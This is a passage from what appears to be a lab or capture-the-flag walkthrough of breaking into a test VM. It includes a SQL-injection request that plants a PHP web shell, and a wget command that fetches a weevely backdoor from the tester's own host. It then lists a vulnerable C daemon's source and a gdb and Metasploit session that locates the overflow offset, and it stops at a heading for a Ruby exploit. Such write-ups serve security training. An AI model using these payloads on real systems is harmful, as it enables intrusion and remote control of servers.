+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>POST /admin/profile.php HTTP/1.1
+</span><span class='line'>Host: 192.168.80.143
+</span><span class='line'>User-Agent: Mozilla/5.0
+</span><span class='line'>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+</span><span class='line'>Accept-Language: en-US,en;q=0.5
+</span><span class='line'>Accept-Encoding: gzip, deflate
+</span><span class='line'>DNT: 1
+</span><span class='line'>Referer: http://192.168.80.143/admin/profile.php
+</span><span class='line'>Connection: keep-alive
+</span><span class='line'>Cache-Control: max-age=0
+</span><span class='line'>Content-Type: application/x-www-form-urlencoded
+</span><span class='line'>Content-Length: 104
+</span><span class='line'>
+</span><span class='line'>username=testa&password=test' or '2'='2&sig=&lt;?php system($_REQUEST['cmd']); ?>&fname=x.php&submit=Submit</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Now we have a simple PHP shell:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>http://192.168.80.143/profiles/testa-x.php?cmd=id
+</span><span class='line'>
+</span><span class='line'>uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We download the weevely.php from our server and connect:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>http://192.168.80.143/profiles/testa-x.php?cmd=wget 192.168.80.137/weevely.php.txt -O c.php
+</span><span class='line'>root@kali32:~# weevely http://192.168.80.143/profiles/c.php 1234</span></code></pre></td></tr></table></div></figure>
+
+
+<p>In the repo directory, we examine the buffd.c. It is a vulnerable daemon,
+listening on port 7777.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+<span class='line-number'>66</span>
+<span class='line-number'>67</span>
+<span class='line-number'>68</span>
+<span class='line-number'>69</span>
+<span class='line-number'>70</span>
+<span class='line-number'>71</span>
+<span class='line-number'>72</span>
+<span class='line-number'>73</span>
+<span class='line-number'>74</span>
+<span class='line-number'>75</span>
+<span class='line-number'>76</span>
+<span class='line-number'>77</span>
+<span class='line-number'>78</span>
+<span class='line-number'>79</span>
+<span class='line-number'>80</span>
+<span class='line-number'>81</span>
+<span class='line-number'>82</span>
+<span class='line-number'>83</span>
+<span class='line-number'>84</span>
+<span class='line-number'>85</span>
+<span class='line-number'>86</span>
+<span class='line-number'>87</span>
+<span class='line-number'>88</span>
+<span class='line-number'>89</span>
+<span class='line-number'>90</span>
+<span class='line-number'>91</span>
+<span class='line-number'>92</span>
+<span class='line-number'>93</span>
+<span class='line-number'>94</span>
+<span class='line-number'>95</span>
+<span class='line-number'>96</span>
+<span class='line-number'>97</span>
+<span class='line-number'>98</span>
+<span class='line-number'>99</span>
+<span class='line-number'>100</span>
+<span class='line-number'>101</span>
+<span class='line-number'>102</span>
+<span class='line-number'>103</span>
+<span class='line-number'>104</span>
+<span class='line-number'>105</span>
+<span class='line-number'>106</span>
+<span class='line-number'>107</span>
+<span class='line-number'>108</span>
+<span class='line-number'>109</span>
+<span class='line-number'>110</span>
+<span class='line-number'>111</span>
+<span class='line-number'>112</span>
+<span class='line-number'>113</span>
+<span class='line-number'>114</span>
+<span class='line-number'>115</span>
+<span class='line-number'>116</span>
+<span class='line-number'>117</span>
+<span class='line-number'>118</span>
+<span class='line-number'>119</span>
+<span class='line-number'>120</span>
+<span class='line-number'>121</span>
+<span class='line-number'>122</span>
+<span class='line-number'>123</span>
+<span class='line-number'>124</span>
+<span class='line-number'>125</span>
+<span class='line-number'>126</span>
+<span class='line-number'>127</span>
+<span class='line-number'>128</span>
+<span class='line-number'>129</span>
+<span class='line-number'>130</span>
+<span class='line-number'>131</span>
+<span class='line-number'>132</span>
+<span class='line-number'>133</span>
+<span class='line-number'>134</span>
+<span class='line-number'>135</span>
+<span class='line-number'>136</span>
+<span class='line-number'>137</span>
+<span class='line-number'>138</span>
+<span class='line-number'>139</span>
+<span class='line-number'>140</span>
+<span class='line-number'>141</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="nl">debian</span><span class="p">:</span><span class="o">/</span><span class="n">tmp</span><span class="err">#</span> <span class="n">cat</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">repo</span><span class="o">/</span><span class="n">buffd</span><span class="p">.</span><span class="n">c</span>
+</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;errno.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;sys/socket.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;netinet/in.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;netdb.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;arpa/inet.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;sys/wait.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;signal.h&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="cp">#define PORT &quot;7777&quot; </span><span class="c1">// the port users will be connecting to</span>
+</span><span class='line'>
+</span><span class='line'><span class="cp">#define BACKLOG 10       </span><span class="c1">// how many pending connections queue will hold</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">void</span> <span class="n">vulnerable</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">net_buffer</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'><span class="kt">char</span> <span class="n">local_buffer</span><span class="p">[</span><span class="mi">120</span><span class="p">];</span>
+</span><span class='line'><span class="n">strcpy</span><span class="p">(</span><span class="n">local_buffer</span><span class="p">,</span> <span class="n">net_buffer</span><span class="p">);</span>
+</span><span class='line'><span class="k">return</span><span class="p">;</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">void</span> <span class="n">sigchld_handler</span><span class="p">(</span><span class="kt">int</span> <span class="n">s</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'><span class="k">while</span><span class="p">(</span><span class="n">waitpid</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">WNOHANG</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">);</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="c1">// get sockaddr, IPv4 or IPv6:</span>
+</span><span class='line'><span class="kt">void</span> <span class="o">*</span><span class="n">get_in_addr</span><span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="n">sa</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="n">sa</span><span class="o">-&gt;</span><span class="n">sa_family</span> <span class="o">==</span> <span class="n">AF_INET</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'><span class="k">return</span> <span class="o">&amp;</span><span class="p">(((</span><span class="k">struct</span> <span class="n">sockaddr_in</span><span class="o">*</span><span class="p">)</span><span class="n">sa</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">sin_addr</span><span class="p">);</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">return</span> <span class="o">&amp;</span><span class="p">(((</span><span class="k">struct</span> <span class="n">sockaddr_in6</span><span class="o">*</span><span class="p">)</span><span class="n">sa</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">sin6_addr</span><span class="p">);</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'><span class="kt">int</span> <span class="n">sockfd</span><span class="p">,</span> <span class="n">new_fd</span><span class="p">;</span> <span class="c1">// listen on sock_fd, new connection on new_fd</span>
+</span><span class='line'><span class="k">struct</span> <span class="n">addrinfo</span> <span class="n">hints</span><span class="p">,</span> <span class="o">*</span><span class="n">servinfo</span><span class="p">,</span> <span class="o">*</span><span class="n">p</span><span class="p">;</span>
+</span><span class='line'><span class="k">struct</span> <span class="n">sockaddr_storage</span> <span class="n">their_addr</span><span class="p">;</span> <span class="c1">// connector&#39;s address information</span>
+</span><span class='line'><span class="kt">socklen_t</span> <span class="n">sin_size</span><span class="p">;</span>
+</span><span class='line'><span class="k">struct</span> <span class="n">sigaction</span> <span class="n">sa</span><span class="p">;</span>
+</span><span class='line'><span class="kt">int</span> <span class="n">yes</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span>
+</span><span class='line'><span class="kt">char</span> <span class="n">in_buffer</span><span class="p">[</span><span class="mi">20</span><span class="p">],</span> <span class="n">out_buffer</span><span class="p">[</span><span class="mi">20</span><span class="p">],</span> <span class="n">net_buffer</span><span class="p">[</span><span class="mi">2048</span><span class="p">];</span>
+</span><span class='line'><span class="kt">char</span> <span class="n">s</span><span class="p">[</span><span class="n">INET6_ADDRSTRLEN</span><span class="p">];</span>
+</span><span class='line'><span class="kt">int</span> <span class="n">rv</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">hints</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span> <span class="n">hints</span><span class="p">);</span>
+</span><span class='line'><span class="n">hints</span><span class="p">.</span><span class="n">ai_family</span> <span class="o">=</span> <span class="n">AF_UNSPEC</span><span class="p">;</span>
+</span><span class='line'><span class="n">hints</span><span class="p">.</span><span class="n">ai_socktype</span> <span class="o">=</span> <span class="n">SOCK_STREAM</span><span class="p">;</span>
+</span><span class='line'><span class="n">hints</span><span class="p">.</span><span class="n">ai_flags</span> <span class="o">=</span> <span class="n">AI_PASSIVE</span><span class="p">;</span> <span class="c1">// use my IP</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">if</span> <span class="p">((</span><span class="n">rv</span> <span class="o">=</span> <span class="n">getaddrinfo</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">PORT</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">hints</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">servinfo</span><span class="p">))</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'><span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;getaddrinfo: %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">gai_strerror</span><span class="p">(</span><span class="n">rv</span><span class="p">));</span>
+</span><span class='line'><span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="c1">// loop through all the results and bind to the first we can</span>
+</span><span class='line'><span class="k">for</span><span class="p">(</span><span class="n">p</span> <span class="o">=</span> <span class="n">servinfo</span><span class="p">;</span> <span class="n">p</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">;</span> <span class="n">p</span> <span class="o">=</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">ai_next</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'><span class="k">if</span> <span class="p">((</span><span class="n">sockfd</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">p</span><span class="o">-&gt;</span><span class="n">ai_family</span><span class="p">,</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">ai_socktype</span><span class="p">,</span>
+</span><span class='line'><span class="n">p</span><span class="o">-&gt;</span><span class="n">ai_protocol</span><span class="p">))</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'><span class="n">perror</span><span class="p">(</span><span class="s">&quot;server: socket&quot;</span><span class="p">);</span>
+</span><span class='line'><span class="k">continue</span><span class="p">;</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="n">setsockopt</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="n">SOL_SOCKET</span><span class="p">,</span> <span class="n">SO_REUSEADDR</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">yes</span><span class="p">,</span>
+</span><span class='line'><span class="k">sizeof</span><span class="p">(</span><span class="kt">int</span><span class="p">))</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'><span class="n">perror</span><span class="p">(</span><span class="s">&quot;setsockopt&quot;</span><span class="p">);</span>
+</span><span class='line'><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="n">bind</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">ai_addr</span><span class="p">,</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">ai_addrlen</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'><span class="n">close</span><span class="p">(</span><span class="n">sockfd</span><span class="p">);</span>
+</span><span class='line'><span class="n">perror</span><span class="p">(</span><span class="s">&quot;server: bind&quot;</span><span class="p">);</span>
+</span><span class='line'><span class="k">continue</span><span class="p">;</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">break</span><span class="p">;</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="n">p</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'><span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;server: failed to bind</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'><span class="k">return</span> <span class="mi">2</span><span class="p">;</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">freeaddrinfo</span><span class="p">(</span><span class="n">servinfo</span><span class="p">);</span> <span class="c1">// all done with this structure</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="n">listen</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="n">BACKLOG</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'><span class="n">perror</span><span class="p">(</span><span class="s">&quot;listen&quot;</span><span class="p">);</span>
+</span><span class='line'><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">sa</span><span class="p">.</span><span class="n">sa_handler</span> <span class="o">=</span> <span class="n">sigchld_handler</span><span class="p">;</span> <span class="c1">// reap all dead processes</span>
+</span><span class='line'><span class="n">sigemptyset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">sa</span><span class="p">.</span><span class="n">sa_mask</span><span class="p">);</span>
+</span><span class='line'><span class="n">sa</span><span class="p">.</span><span class="n">sa_flags</span> <span class="o">=</span> <span class="n">SA_RESTART</span><span class="p">;</span>
+</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="n">sigaction</span><span class="p">(</span><span class="n">SIGCHLD</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">sa</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'><span class="n">perror</span><span class="p">(</span><span class="s">&quot;sigaction&quot;</span><span class="p">);</span>
+</span><span class='line'><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">printf</span><span class="p">(</span><span class="s">&quot;server: waiting for connections...</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// main accept() loop</span>
+</span><span class='line'><span class="n">sin_size</span> <span class="o">=</span> <span class="k">sizeof</span> <span class="n">their_addr</span><span class="p">;</span>
+</span><span class='line'><span class="n">new_fd</span> <span class="o">=</span> <span class="n">accept</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">their_addr</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">sin_size</span><span class="p">);</span>
+</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="n">new_fd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'><span class="n">perror</span><span class="p">(</span><span class="s">&quot;accept&quot;</span><span class="p">);</span>
+</span><span class='line'><span class="k">continue</span><span class="p">;</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">inet_ntop</span><span class="p">(</span><span class="n">their_addr</span><span class="p">.</span><span class="n">ss_family</span><span class="p">,</span>
+</span><span class='line'><span class="n">get_in_addr</span><span class="p">((</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">their_addr</span><span class="p">),</span>
+</span><span class='line'><span class="n">s</span><span class="p">,</span> <span class="k">sizeof</span> <span class="n">s</span><span class="p">);</span>
+</span><span class='line'><span class="n">printf</span><span class="p">(</span><span class="s">&quot;server: got connection from %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">s</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">fork</span><span class="p">())</span> <span class="p">{</span> <span class="c1">// this is the child process</span>
+</span><span class='line'><span class="n">close</span><span class="p">(</span><span class="n">sockfd</span><span class="p">);</span> <span class="c1">// child doesn&#39;t need the listener</span>
+</span><span class='line'><span class="n">memset</span><span class="p">(</span><span class="n">net_buffer</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1024</span><span class="p">);</span>
+</span><span class='line'><span class="n">strcpy</span><span class="p">(</span><span class="n">out_buffer</span><span class="p">,</span> <span class="s">&quot;HELO</span><span class="se">\n</span><span class="s">COMMAND:&quot;</span><span class="p">);</span>
+</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="n">send</span><span class="p">(</span><span class="n">new_fd</span><span class="p">,</span> <span class="n">out_buffer</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">out_buffer</span><span class="p">),</span> <span class="mi">0</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+</span><span class='line'><span class="n">perror</span><span class="p">(</span><span class="s">&quot;send&quot;</span><span class="p">);</span>
+</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="n">recv</span><span class="p">(</span><span class="n">new_fd</span><span class="p">,</span> <span class="n">net_buffer</span><span class="p">,</span> <span class="mi">1024</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'><span class="n">vulnerable</span><span class="p">(</span><span class="n">net_buffer</span><span class="p">);</span>
+</span><span class='line'><span class="n">strcpy</span><span class="p">(</span><span class="n">out_buffer</span><span class="p">,</span> <span class="s">&quot;RECV: &quot;</span><span class="p">);</span>
+</span><span class='line'><span class="n">strcat</span><span class="p">(</span><span class="n">out_buffer</span><span class="p">,</span> <span class="n">net_buffer</span><span class="p">);</span>
+</span><span class='line'><span class="n">send</span><span class="p">(</span><span class="n">new_fd</span><span class="p">,</span> <span class="n">out_buffer</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">out_buffer</span><span class="p">),</span> <span class="mi">0</span><span class="p">);</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'><span class="n">close</span><span class="p">(</span><span class="n">new_fd</span><span class="p">);</span>
+</span><span class='line'><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'><span class="n">close</span><span class="p">(</span><span class="n">new_fd</span><span class="p">);</span> <span class="c1">// parent doesn&#39;t need this</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We copy buffd binary from server (/usr/local/sbin/buffd) and using metasploit
+patterns we calculate the offset for EIP. To make an exploit reliable, we are
+looking also for some registers, pointing to our pattern in memory.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~/repo# gdb ./buffd  -q
+</span><span class='line'>Reading symbols from /root/repo/buffd...done.
+</span><span class='line'>(gdb) set follow-fork-mode child
+</span><span class='line'>(gdb) run
+</span><span class='line'>Starting program: /root/repo/buffd
+</span><span class='line'>warning: no loadable sections found in added symbol-file system-supplied DSO at 0xb7fe0000
+</span><span class='line'>server: waiting for connections...
+</span><span class='line'>server: got connection from 127.0.0.1
+</span><span class='line'>[New process 4201]
+</span><span class='line'>
+</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
+</span><span class='line'>[Switching to process 4201]
+</span><span class='line'>0x65413165 in ?? ()
+</span><span class='line'>(gdb) i r
+</span><span class='line'>eax            0xbfffe790       -1073748080
+</span><span class='line'>ecx            0x0      0
+</span><span class='line'>edx            0xca     202
+</span><span class='line'>ebx            0xb7fbeff4       -1208225804
+</span><span class='line'>esp            0xbfffe810       0xbfffe810
+</span><span class='line'>ebp            0x41306541       0x41306541
+</span><span class='line'>esi            0x0      0
+</span><span class='line'>edi            0x0      0
+</span><span class='line'>eip            0x65413165       0x65413165
+</span><span class='line'>eflags         0x10246  [ PF ZF IF RF ]
+</span><span class='line'>cs             0x73     115
+</span><span class='line'>ss             0x7b     123
+</span><span class='line'>ds             0x7b     123
+</span><span class='line'>es             0x7b     123
+</span><span class='line'>fs             0x0      0
+</span><span class='line'>gs             0x33     51
+</span><span class='line'>(gdb) x /5x $eax
+</span><span class='line'>0xbfffe790:     0x41306141      0x61413161      0x33614132      0x41346141
+</span><span class='line'>0xbfffe7a0:     0x61413561
+</span><span class='line'>
+</span><span class='line'>root@kali32:~# nc 127.0.0.1 7777
+</span><span class='line'>HELO
+</span><span class='line'>COMMAND:Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+</span><span class='line'>^C
+</span><span class='line'>root@kali32:~# /usr/share/metasploit-framework/tools/pattern_offset.rb 0x65413165
+</span><span class='line'>[*] Exact match at offset 124
+</span><span class='line'>root@kali32:~# /usr/share/metasploit-framework/tools/pattern_offset.rb 0x41306141
+</span><span class='line'>[*] Exact match at offset 0</span></code></pre></td></tr></table></div></figure>
+
+
+<p>EIP begins on offset 124 and the register EAX points to the beginning of our
+buffer, right now filled with pattern. Luckily, we find call eax opcodes in
+binary too.</p>
+
+<p>The strange thing is that the stack in binary is marked as non-executable,
+but on this server the exploit works and we don&rsquo;t get segfault:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>www-data@:/home/testuser $ readelf -lW /usr/local/sbin/buffd
+</span><span class='line'>Elf file type is EXEC (Executable file)
+</span><span class='line'>Entry point 0x80488e0
+</span><span class='line'>There are 7 program headers, starting at offset 52
+</span><span class='line'>
+</span><span class='line'>Program Headers:
+</span><span class='line'>  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
+</span><span class='line'>  PHDR           0x000034 0x08048034 0x08048034 0x000e0 0x000e0 R E 0x4
+</span><span class='line'>  INTERP         0x000114 0x08048114 0x08048114 0x00013 0x00013 R   0x1
+</span><span class='line'>      [Requesting program interpreter: /lib/ld-linux.so.2]
+</span><span class='line'>  LOAD           0x000000 0x08048000 0x08048000 0x01004 0x01004 R E 0x1000
+</span><span class='line'>  LOAD           0x001004 0x0804a004 0x0804a004 0x00170 0x0017c RW  0x1000
+</span><span class='line'>  DYNAMIC        0x001018 0x0804a018 0x0804a018 0x000d0 0x000d0 RW  0x4
+</span><span class='line'>  NOTE           0x000128 0x08048128 0x08048128 0x00020 0x00020 R   0x4
+</span><span class='line'>  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x4</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Exploit in Ruby:</p>
+
